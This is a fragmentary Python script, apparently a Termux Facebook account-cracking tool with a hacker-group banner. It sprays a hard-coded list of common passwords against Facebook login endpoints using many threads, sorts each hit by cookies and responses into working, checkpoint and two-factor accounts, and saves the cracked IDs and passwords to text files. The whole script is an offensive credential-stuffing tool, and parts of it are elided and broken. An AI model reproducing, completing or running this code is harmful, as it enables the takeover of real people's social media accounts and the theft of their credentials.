...
BXB="""
 ...
 \033[1;31m██   ██  \033[1;36m██     \033[1;34m██     \033[1;35m██   ██ \033[1;31m██████                                                                                          
\033[1;97m ------------------------------
\033[1;35m [+] Author : MD Riyadul Momin 
\033[1;36m [+] Github  : github.com/Rk-Black 
\033[1;31m [+] Whatsapp : Termux Command(BXB)
\033[1;34m [+] FB Group : Rk Black Hacker Zone
\033[1;35m [+] version: 0.3.7
\033[1;97m ------------------------------"""
...
def random_crack():
    ...
    if opt =='1':
        ...
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            ...
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps,'khan123','khan1234','khan12345','khan786','bangladesh','pakistan','alihasan']
    	...
    	os.system("xdg-open https://facebook.com/groups/rk.black.hacker.zone/")
        ...
        print(BXB)
        domain = input('\n [+] put domain: ')
        os.system("xdg-open https://www.github.com/Rk-Black")
        os.system('clear')
        print(BXB)
        lists = ['3','4']
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[RIYAD] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[RIYAD-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[RIYAD-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                print('\033[1;32m[RIYAD-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[RIYAD-2F] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[RIYAD-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    sys.stdout.write('\r \033[1;37m%s RIYAD| OK:%s | CP:%s  '%(loop,len(ok),len(cp)));sys.stdout.flush()
    try:
        for pas in passlist:
...
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            ...
            if 'c_user' in cookies:
                    print('\033[1;32m[RIYAD-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/RIYAD_ID/ok.txt', 'a').write(ids+' | '+pas+'\n').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[RIYAD-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/RIYAD_ID/random2f.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            print('\033[1;31m[RIYAD-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/RIYAD_ID/randomcp.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
        loop+=1
    except Exception as e:
